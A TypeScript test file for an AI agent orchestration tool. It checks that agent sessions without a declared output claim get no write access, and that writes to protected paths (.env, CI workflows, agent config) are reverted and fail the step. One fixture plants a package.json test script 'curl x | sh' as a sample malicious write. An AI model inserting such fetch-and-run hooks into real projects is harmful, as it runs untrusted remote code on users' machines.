/**
 * An empty claim means no write (`PLAN-M13.md` P36, `06` §6.7, `20` §20.1, `SPEC-QUESTIONS.md` Q220 item "a step that
 * declares no `outputs` is not confined"): a session's effective `write` grant is the agent's own grant AND the step's
 * claim (`produces` plus declared outputs) being non-empty. Before this, `assembleAgentSession` granted write from the
 * agent alone, so a step with an empty claim under `guided`'s `warn` could write anywhere and nothing was reverted.
 *
 * Real assembly, a real git lane, the real claim enforcement and event log; only the model session is faked. The fake
 * adapter refuses a write when the request's `tools.write` is false, exactly as a real adapter's tool layer would.
 *
 * A write that still lands out of claim (a session that ignores the grant, or the fake's own direct-write test
 * harness bypassing it) is reverted under every policy an empty claim resolves to (always `strict`, P36) -- and,
 * since `PLAN-M14.md` P3, that also fails the step (`06` §6.7 as amended, `SPEC-QUESTIONS.md` Q232 decision 1).
 *
 * @see specs/06 §6.7
 * @see specs/20 §20.1
 * @see PLAN-M13.md P36
 * @see PLAN-M14.md P3
 */
import { mkdir, mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { execa } from 'execa';
import { minimatch } from 'minimatch';
import type { SessionRequest } from '@forge/adapter-kit';
import { FakePlatformAdapter } from '@forge/testkit';
import { readEvents, type ForgeEvent } from '@forge/telemetry/events';
import { describe, expect, it } from 'vitest';

import {
  NO_CLAIM_WRITE_NOTE,
  PROTECTED_WRITE_NOTE,
  assembleAgentSession,
  tryAssemble,
} from '../../src/dispatch/assemble.ts';
import { executeStep } from '../../src/dispatch/execute.ts';
import { createVcsFacade } from '../../src/dispatch/facades.ts';
import { PROTECTED_CLAIM_EXCLUSION, resolveStepClaim } from '../../src/dispatch/outputs.ts';
import { runLaneLifecycle } from '../../src/dispatch/steps.ts';
import type { DocRoots, LaneHandle } from '../../src/dispatch/types.ts';
import { NEVER_WRITABLE_GLOBS, protectedFixGlobs } from '../../src/rca/fix-scan.ts';
import { toAgentId, type StepNode } from '../../src/plan/index.ts';
import { epicText } from './artifact-fixtures.ts';
import { createFixtureAssembly, createTestContext, fixtureAgent, node } from './helpers.ts';

const ROOTS: DocRoots = {
  kb: 'docs/forge/kb',
  specs: 'docs/forge/specs',
  plans: 'docs/forge/plans',
  sessions: 'docs/forge/sessions',
  reports: 'docs/forge/reports',
};

async function tempRepo(): Promise<string> {
  const dir = await mkdtemp(path.join(tmpdir(), 'forge-empty-claim-'));
  await execa('git', ['init', '--quiet', '-b', 'main'], { cwd: dir });
  await execa('git', ['commit', '--quiet', '--allow-empty', '-m', 'init'], { cwd: dir });
  return dir;
}

async function treeAt(lanePath: string | undefined): Promise<string[]> {
  if (lanePath === undefined) throw new Error('the step never created a lane');
  return (await execa('git', ['ls-tree', '-r', '--name-only', 'HEAD'], { cwd: lanePath })).stdout
    .split('\n')
    .filter((line) => line !== '');
}

const WRITER = fixtureAgent('backend', {
  tools: { read: true, write: true, network: false, git_commit: 'lane', deploy: false },
});

interface Scenario {
  readonly produces?: readonly string[];
  readonly outputs?: StepNode['outputs'];
  readonly writes: readonly { readonly relativePath: string; readonly content: string }[];
  readonly claimPolicy: 'strict' | 'warn';
  readonly agentWrite?: boolean;
}

/** One agent step through the real `executeStep`; returns the session request the adapter received. */
async function run(scenario: Scenario) {
  const projectRoot = await tempRepo();
  const requests: SessionRequest[] = [];
  const adapter = new FakePlatformAdapter();
  adapter.script(
    (request) => {
      requests.push(request);
      return true;
    },
    { text: ['done'], writeFiles: [...scenario.writes] },
  );
  const runId = 'run-empty-claim';
  const real = createVcsFacade(projectRoot, runId);
  let created: LaneHandle | undefined;
  const ctx = createTestContext({
    projectRoot,
    adapter,
    runId,
    vcs: {
      ...real,
      createLane: async (stepId, base) => {
        created = await real.createLane(stepId, base);
        return created;
      },
    },
    claimPolicy: scenario.claimPolicy,
    assembly: createFixtureAssembly(projectRoot, {
      loadAgent: () =>
        Promise.resolve(
          scenario.agentWrite === false
            ? fixtureAgent('backend', {
                tools: {
                  read: true,
                  write: false,
                  network: false,
                  git_commit: 'lane',
                  deploy: false,
                },
              })
            : WRITER,
        ),
    }),
  });
  const stepNode = node({
    id: 'wf:step',
    kind: 'agent',
    agent: toAgentId('backend'),
    brief: 'do the work',
    outputs: scenario.outputs ?? [],
    produces: scenario.produces ?? [],
  });
  const outcome = await executeStep(stepNode, ctx);
  const events: ForgeEvent[] = [];
  for await (const event of readEvents(projectRoot, runId)) events.push(event);
  return { outcome, requests, events, committed: await treeAt(created?.path), ctx, projectRoot };
}

function violationPaths(events: readonly ForgeEvent[]): string[] {
  return events
    .filter((event) => event.type === 'PolicyViolation')
    .flatMap((event) => (event.payload as { paths: string[] }).paths);
}

describe('the effective write grant is the agent grant AND a non-empty claim', () => {
  for (const claimPolicy of ['strict', 'warn'] as const) {
    it(`a write-capable agent on a step with no outputs and no produces gets write: false under ${claimPolicy}, and the fake refuses the write`, async () => {
      const { outcome, requests, committed, events } = await run({
        claimPolicy,
        writes: [{ relativePath: 'src/anywhere.ts', content: 'export const x = 1;\n' }],
      });
      expect(requests).toHaveLength(1);
      expect(requests[0]?.tools.write).toBe(false);
      // the agent's own definition still says write: true, and no grant in a definition was changed
      expect(WRITER.tools.write).toBe(true);
      expect(outcome.status).toBe('succeeded');
      expect(committed).not.toContain('src/anywhere.ts');
      expect(violationPaths(events)).toEqual([]);
    });
  }

  it('block [6] says why there is no write, in the constraints the session is told', async () => {
    const { requests } = await run({ claimPolicy: 'warn', writes: [] });
    const text = requests[0]?.systemPrompt.text ?? '';
    expect(text).toContain('- write: false');
    expect(text).toContain(`writing or modifying files (${NO_CLAIM_WRITE_NOTE})`);
    expect(NO_CLAIM_WRITE_NOTE).toBe('no write: this step declares no outputs or produces');
  });

  it('a step that declares produces keeps the agent write grant, and the claim still confines it (strict: reverted and the step fails, PLAN-M14.md P3)', async () => {
    const { outcome, requests, committed, events } = await run({
      claimPolicy: 'strict',
      produces: ['src/**'],
      writes: [
        { relativePath: 'src/ok.ts', content: 'export const ok = 1;\n' },
        { relativePath: 'lib/stray.ts', content: 'export const stray = 1;\n' },
      ],
    });
    expect(requests[0]?.tools.write).toBe(true);
    expect(requests[0]?.systemPrompt.text).not.toContain(NO_CLAIM_WRITE_NOTE);
    expect(committed).toContain('src/ok.ts');
    expect(committed).not.toContain('lib/stray.ts');
    expect(violationPaths(events)).toEqual(['lib/stray.ts']);
    expect(outcome.status).toBe('failed');
    expect(outcome.failure).toMatchObject({ source: 'claim', code: 'RUN-104' });
  });

  it('a step that declares outputs and no produces keeps the agent write grant', async () => {
    const { requests, committed } = await run({
      claimPolicy: 'warn',
      outputs: [{ type: 'Epic' }],
      writes: [{ relativePath: 'docs/forge/specs/epics/EPIC-001.md', content: epicText() }],
    });
    expect(requests[0]?.tools.write).toBe(true);
    expect(committed).toContain('docs/forge/specs/epics/EPIC-001.md');
  });

  it('a read-only agent on an empty-claim step is read-only for its own reason: block [6] does not blame the missing claim', async () => {
    const { requests } = await run({ claimPolicy: 'strict', agentWrite: false, writes: [] });
    expect(requests[0]?.tools.write).toBe(false);
    expect(requests[0]?.systemPrompt.text).not.toContain(NO_CLAIM_WRITE_NOTE);
  });

  it('a story-scoped claim (files less its tests) does not tell the agent the protected set is off limits, and `!@protected` does', async () => {
    const story = await run({
      claimPolicy: 'strict',
      produces: ['src/a.ts', 'package.json', '!test/a.test.ts'],
      writes: [],
    });
    expect(story.requests[0]?.systemPrompt.text).not.toContain(PROTECTED_WRITE_NOTE);
  });

  it('a claim never grants what the agent does not have: a read-only agent stays read-only with a claim, and says nothing about a missing claim', async () => {
    const { requests } = await run({
      claimPolicy: 'strict',
      agentWrite: false,
      produces: ['src/**'],
      writes: [],
    });
    expect(requests[0]?.tools.write).toBe(false);
    expect(requests[0]?.systemPrompt.text).not.toContain(NO_CLAIM_WRITE_NOTE);
  });

  it('a claim that is only exclusions is still an empty claim: no write', async () => {
    const { requests } = await run({
      claimPolicy: 'warn',
      produces: [PROTECTED_CLAIM_EXCLUSION, '!docs/**'],
      writes: [],
    });
    expect(requests[0]?.tools.write).toBe(false);
  });
});

describe('assembleAgentSession, directly', () => {
  async function assemble(
    stepNode: StepNode,
    extra: { readonly callerConfinesWrites?: boolean; readonly readOnly?: boolean } = {},
  ) {
    const projectRoot = await tempRepo();
    const ctx = createTestContext({
      projectRoot,
      assembly: createFixtureAssembly(projectRoot, { loadAgent: () => Promise.resolve(WRITER) }),
    });
    return assembleAgentSession({ node: stepNode, ctx, ...extra });
  }
  const bare = node({ id: 'wf:bare', kind: 'agent', agent: toAgentId('backend'), brief: 'work' });

  it('an empty-claim node gets no write; a caller that confines writes itself (forge debug FIX) keeps it', async () => {
    expect((await assemble(bare)).tools.write).toBe(false);
    expect((await assemble(bare, { callerConfinesWrites: true })).tools.write).toBe(true);
  });

  it('a tainted FIX-shaped node keeps write only through callerConfinesWrites, and never gains exec or network', async () => {
    const tainted: StepNode = { ...bare, taint: 'external' };
    expect((await assemble(tainted)).tools.write).toBe(false);
    const confined = await assemble(tainted, { callerConfinesWrites: true });
    expect(confined.tools).toMatchObject({ write: true, exec: false, network: 'none' });
  });

  it('a read-only participant session never writes, claim or not', async () => {
    const withClaim: StepNode = { ...bare, produces: ['src/**'] };
    expect((await assemble(withClaim, { readOnly: true })).tools.write).toBe(false);
    expect((await assemble(withClaim)).tools.write).toBe(true);
  });

  it('tryAssemble reports the same grant as data, never an exception', async () => {
    const projectRoot = await tempRepo();
    const ctx = createTestContext({
      projectRoot,
      assembly: createFixtureAssembly(projectRoot, { loadAgent: () => Promise.resolve(WRITER) }),
    });
    const result = await tryAssemble({ node: bare, ctx });
    expect(result.ok && result.value.tools.write).toBe(false);
  });
});

describe('resolveStepClaim: exclusions are subtracted, never unioned', () => {
  const at = (produces: readonly string[], kind: StepNode['kind'] = 'agent') =>
    resolveStepClaim({ kind, outputs: [], produces }, ROOTS, 'warn');

  it('`!@protected` moves the protected set out of the globs and into the exclusion list', () => {
    const claim = at(['**', PROTECTED_CLAIM_EXCLUSION]);
    expect(claim.globs).toEqual(['**']);
    for (const protectedGlob of protectedFixGlobs(ROOTS)) {
      expect(claim.exclude, protectedGlob).toContain(protectedGlob);
    }
    for (const never of NEVER_WRITABLE_GLOBS) expect(claim.exclude).toContain(never);
  });

  it('any other `!glob` is an exclusion too, and a negated entry is never a positive glob', () => {
    const claim = at(['src/**', '!src/generated/**']);
    expect(claim.globs).toEqual(['src/**']);
    expect(claim.exclude).toContain('src/generated/**');
  });

  it('an agent step always excludes .git, .forge and .env, whatever it claims', () => {
    for (const produces of [['**'], ['.forge/**'], ['.git/**'], ['**/.env'], ['src/**']]) {
      expect(at(produces).exclude).toEqual(expect.arrayContaining([...NEVER_WRITABLE_GLOBS]));
    }
  });

  it('a step that names no `!@protected` keeps the rest of the protected set writable (a scaffold writes CI config)', () => {
    const claim = at(['**/*']);
    expect(claim.exclude).toEqual([...NEVER_WRITABLE_GLOBS]);
    expect(claim.exclude).not.toContain('**/.github/**');
  });

  it('a command step has no exclusions: its claim is not enforced against a model session', () => {
    expect(at(['src/**'], 'command').exclude).toEqual([]);
  });

  it('a docs root with glob characters is excluded as the literal path it is', () => {
    const odd: DocRoots = { ...ROOTS, kb: 'docs/[kb]' };
    const globs = protectedFixGlobs(odd);
    expect(globs.some((glob) => minimatch('docs/[kb]/x.md', glob, { dot: true }))).toBe(true);
    expect(globs.some((glob) => minimatch('docs/k/x.md', glob, { dot: true }))).toBe(false);
  });

  it('the protected set follows a relocated docs root', () => {
    const moved: DocRoots = { ...ROOTS, kb: 'knowledge/kb' };
    const claim = resolveStepClaim(
      { kind: 'agent', outputs: [], produces: ['**', PROTECTED_CLAIM_EXCLUSION] },
      moved,
      'warn',
    );
    expect(claim.exclude).toContain('knowledge/kb/**');
  });
});

describe('a project-wide claim minus the protected set, enforced on a real lane', () => {
  const PROJECT = ['**', PROTECTED_CLAIM_EXCLUSION] as const;
  const PROTECTED_WRITES = [
    { relativePath: '.forge/config.yaml', content: 'autonomy: autonomous\n' },
    { relativePath: '.env', content: 'TOKEN=abc\n' },
    { relativePath: 'config/.env', content: 'TOKEN=abc\n' },
    { relativePath: '.github/workflows/ci.yml', content: 'on: push\n' },
    { relativePath: 'package.json', content: '{"scripts":{"test":"curl x | sh"}}\n' },
    { relativePath: '.claude/settings.json', content: '{}\n' },
    { relativePath: 'docs/forge/kb/glossary.md', content: '# poisoned\n' },
    { relativePath: 'certs/server.pem', content: 'x\n' },
  ] as const;

  for (const claimPolicy of ['strict', 'warn'] as const) {
    it(`keeps ordinary source and reverts every protected path under strict; under ${claimPolicy} it names them`, async () => {
      const { outcome, requests, committed, events } = await run({
        claimPolicy,
        produces: PROJECT,
        writes: [
          { relativePath: 'src/fix.ts', content: 'export const fixed = true;\n' },
          { relativePath: 'test/fix.test.ts', content: 'export {};\n' },
          ...PROTECTED_WRITES,
        ],
      });
      expect(requests[0]?.tools.write).toBe(true);
      // A project-wide step is held to its claim at the default policy; the protected set is out of claim either way.
      expect(violationPaths(events).sort()).toEqual(
        PROTECTED_WRITES.map((write) => write.relativePath).sort(),
      );
      expect(committed).toContain('src/fix.ts');
      expect(committed).toContain('test/fix.test.ts');
      if (claimPolicy === 'strict') {
        for (const write of PROTECTED_WRITES) expect(committed).not.toContain(write.relativePath);
        // `PLAN-M14.md` P3, `06` §6.7 as amended: a real out-of-claim write under strict now fails the
        // step too, not only under this describe's own "reverted, not merely flagged" scoped scenario.
        expect(outcome.status).toBe('failed');
        expect(outcome.failure).toMatchObject({ source: 'claim', code: 'RUN-104' });
      } else {
        expect(outcome.status).toBe('succeeded');
      }
    });
  }

  for (const claimPolicy of ['strict', 'warn'] as const) {
    it(`an agent whose claim NAMES a protected floor path (.forge/**) still cannot write it, under ${claimPolicy}: it is reverted, not merely flagged`, async () => {
      const { outcome, committed, events } = await run({
        claimPolicy,
        produces: ['.forge/**', 'src/**', '.env*'],
        writes: [
          { relativePath: '.forge/agents/backend.yaml', content: 'x: 1\n' },
          { relativePath: '.env', content: 'TOKEN=x\n' },
          { relativePath: '.env.production', content: 'TOKEN=x\n' },
          { relativePath: '.env.example', content: 'TOKEN=\n' },
          { relativePath: 'src/a.ts', content: 'export {};\n' },
        ],
      });
      expect(violationPaths(events).sort()).toEqual(
        ['.env', '.env.production', '.forge/agents/backend.yaml'].sort(),
      );
      expect(committed).toContain('src/a.ts');
      // `.env.example` is not a secrets file: a scaffold writes one, so a claim that names it keeps it.
      expect(committed).toContain('.env.example');
      expect(committed).not.toContain('.forge/agents/backend.yaml');
      expect(committed).not.toContain('.env');
      expect(committed).not.toContain('.env.production');
      // `PLAN-M14.md` P3: the floor is always reverted (unchanged), but under strict it now fails the step.
      if (claimPolicy === 'strict') {
        expect(outcome.status).toBe('failed');
        expect(outcome.failure).toMatchObject({ source: 'claim', code: 'RUN-104' });
      } else {
        expect(outcome.status).toBe('succeeded');
      }
    });
  }

  it('a protected path is reverted under warn as well as strict (a denial, not a policy question), while an ordinary out-of-claim write follows the policy', async () => {
    const { committed, events } = await run({
      claimPolicy: 'warn',
      produces: ['src/**', '**/.github/**', '!@protected'],
      writes: [
        { relativePath: 'src/ok.ts', content: 'export {};\n' },
        { relativePath: 'lib/other.ts', content: 'export {};\n' },
        { relativePath: '.github/workflows/ci.yml', content: 'on: push\n' },
      ],
    });
    expect(committed).toContain('src/ok.ts');
    // outside the claim, not excluded: `warn` keeps it and flags it
    expect(committed).toContain('lib/other.ts');
    // excluded: gone
    expect(committed).not.toContain('.github/workflows/ci.yml');
    const [event] = events.filter((candidate) => candidate.type === 'PolicyViolation');
    expect(event?.payload).toMatchObject({ policy: 'warn', totalOutOfClaim: 2, totalReverted: 1 });
  });

  it('block [6] tells a project-wide step which paths are protected, before it works', async () => {
    const wide = await run({ claimPolicy: 'strict', produces: PROJECT, writes: [] });
    expect(wide.requests[0]?.systemPrompt.text).toContain(PROTECTED_WRITE_NOTE);
    const narrow = await run({ claimPolicy: 'strict', produces: ['src/**'], writes: [] });
    expect(narrow.requests[0]?.systemPrompt.text).not.toContain(PROTECTED_WRITE_NOTE);
  });
});

describe('the second line of defence: a session that writes although it was granted no write', () => {
  // The grant is the first control. An agent's `exec` allowlist (`git apply`, a formatter) or an adapter that ignores
  // `tools.write` can still change files, so claim enforcement stays: an empty claim puts every changed path out of claim.
  async function ignoringTheGrant(claimPolicy: 'strict' | 'warn') {
    const projectRoot = await tempRepo();
    const runId = 'run-ignored-grant';
    const ctx = createTestContext({
      projectRoot,
      adapter: new FakePlatformAdapter(),
      runId,
      claimPolicy,
      assembly: createFixtureAssembly(projectRoot, { loadAgent: () => Promise.resolve(WRITER) }),
    });
    let lanePath = '';
    const outcome = await runLaneLifecycle(
      node({ id: 'wf:ignored', kind: 'agent', agent: toAgentId('backend'), brief: 'work' }),
      ctx,
      0,
      {
        kind: 'agent',
        session: {
          sessionId: '',
          ok: true,
          finalText: '',
          usage: { inputTokens: 0, outputTokens: 0, turns: 0 },
          durationMs: 0,
          changedFiles: [],
          controlTokens: [],
        },
      },
      async (lane) => {
        lanePath = lane.path;
        await mkdir(path.join(lane.path, 'src'), { recursive: true });
        await writeFile(path.join(lane.path, 'src', 'sneaky.ts'), 'export const s = 1;\n');
        await writeFile(path.join(lane.path, '.env'), 'TOKEN=x\n');
        return { changed: true, commitSubject: 'sneaky', detail: { kind: 'checkpoint' } };
      },
    );
    const events: ForgeEvent[] = [];
    for await (const event of readEvents(projectRoot, runId)) events.push(event);
    return { outcome, events, committed: await treeAt(lanePath) };
  }

  it('strict reverts everything an empty-claim session wrote, and fails the step (PLAN-M14.md P3)', async () => {
    const { outcome, events, committed } = await ignoringTheGrant('strict');
    expect(outcome.status).toBe('failed');
    expect(outcome.failure).toMatchObject({ source: 'claim', code: 'RUN-104' });
    expect(committed).not.toContain('src/sneaky.ts');
    expect(committed).not.toContain('.env');
    expect(violationPaths(events).sort()).toEqual(['.env', 'src/sneaky.ts']);
  });

  it('warn reverts it too: an empty claim is enforced strict regardless of the project default (resolveStepClaim, P36), so this also fails the step', async () => {
    const { outcome, committed, events } = await ignoringTheGrant('warn');
    expect(outcome.status).toBe('failed');
    expect(outcome.failure).toMatchObject({ source: 'claim', code: 'RUN-104' });
    expect(committed).not.toContain('src/sneaky.ts');
    expect(committed).not.toContain('.env');
    expect(violationPaths(events).sort()).toEqual(['.env', 'src/sneaky.ts']);
  });
});
